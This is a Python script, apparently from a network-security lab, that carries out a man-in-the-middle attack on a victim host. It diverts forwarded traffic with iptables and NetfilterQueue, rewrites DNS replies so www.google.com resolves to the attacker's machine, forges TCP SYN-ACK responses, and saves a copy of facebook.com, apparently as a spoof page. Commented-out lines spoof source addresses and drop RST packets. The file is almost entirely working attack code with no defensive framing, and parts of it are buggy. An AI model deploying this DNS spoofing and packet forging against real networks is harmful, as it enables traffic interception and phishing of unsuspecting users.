# if(packet[IP].src == victim and packet[TCP].dport == 443): #and packet[TCP].flags == 0x002):#from M1 to server when port 443, SYN
#             print("insideeeeeeeeeeeeeeeeeeeeeeeeeeeee")
#             packet[IP].src = attacker
#             #packet[TCP].dport = 80
#             del packet[IP].chksum
#             del packet[IP].len
#             del packet[TCP].chksum
#         if(packet[IP].src == victim and packet[TCP].flags == "S"):
#             print("this is SYN")
from scapy.all import * 
import random

# import os
GOOGLE_IP = "142.250.179.132"


# print("start handshake")
# sport = random.randint(1024, 65535)
# ip = IP(src ="10.0.2.5", dst = GOOGLE_IP) #google ip  
# tcpSYN = TCP(sport = sport, dport = 443, flags ="S", seq = 1000) 
# pktSYNACK = sr1(ip/tcpSYN)

# #os.system("sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 10.0.2.5 -j DROP")

# #send ACK after receiving SYNACK
# ACK = TCP(sport = sport, dport = 443, flags ="A", seq = 1001, ack = pktSYNACK.seq + 1)
# send(ip/ACK)

#http
# pkts = sniff(count = 5)
import requests
from netfilterqueue import NetfilterQueue
import os 


response = requests.get("https://facebook.com").text
with open("google.html", "w") as f:
    f.write(response.encode("utf-8").strip())

#print(response.headers)
#print("--------------------------------------------")
#print(response.text)


#capture requestPkt from M1
# packetFromM1 = sniff(filter = "port 80 and host 10.0.2.4", count=1)[0]
# print(packetFromM1.show())
#craft a response pkt to M1
# ip = IP(src ="10.0.2.5", dst = "10.0.2.4") #google ip  
# tcpSYNACK = TCP(sport = 6834, dport = packetFromM1[TCP].sport, flags ="SA", seq = 1000, ack = packetFromM1.seq + 1) 
# pktACK = sr1(ip/tcpSYNACK)
# print("Packet response --------------------")
# print(pktACK.show())
#os.system("sudo iptables --flush")


def processPkt(packet):
    scapyPkt = IP(packet.get_payload())
    if scapyPkt.haslayer(DNSRR):
        try:
            scapyPkt = modifyPkt(scapyPkt)
            packet.set_payload(bytes(scapyPkt))
        except IndexError:
            print("Error")
            pass
    if scapyPkt.haslayer(TCP) and scapyPkt[TCP].flags == "S":
        # sport = random.randint(1024, 65535)
        # craft a response pkt to M1
        ip = IP(src ="10.0.2.5", dst = "10.0.2.4") #google ip  
        tcpSYNACK = TCP(sport = 8081, dport = scapyPkt[TCP].sport, flags ="SA", seq = 1000, ack = scapyPkt.seq + 1) 
        pktACK = sr1(ip/tcpSYNACK)
        packet.set_payload(bytes(pktACK))

    packet.accept()

def modifyPkt(packet):
    # ?? capitals or not??
    packet[DNS].an = DNSRR(rrname = b"www.google.com", rdata="10.0.2.5")
    # packet[UDP].dport = 8081
    # packet[IP].src = packet[IP]
    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len    
    del packet[UDP].chksum

    print("return DNS")
    
    return packet

# try:
#     sniff(prn = processPkt, lfilter = lambda x: x.haslayer(DNSQR), iface = "enp0s9")
queueNum = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queueNum))


# #os.system("sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 10.0.2.5 -j DROP")


queue = NetfilterQueue()
#iptable is a firewall rules
try:
    queue.bind(queueNum, processPkt)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")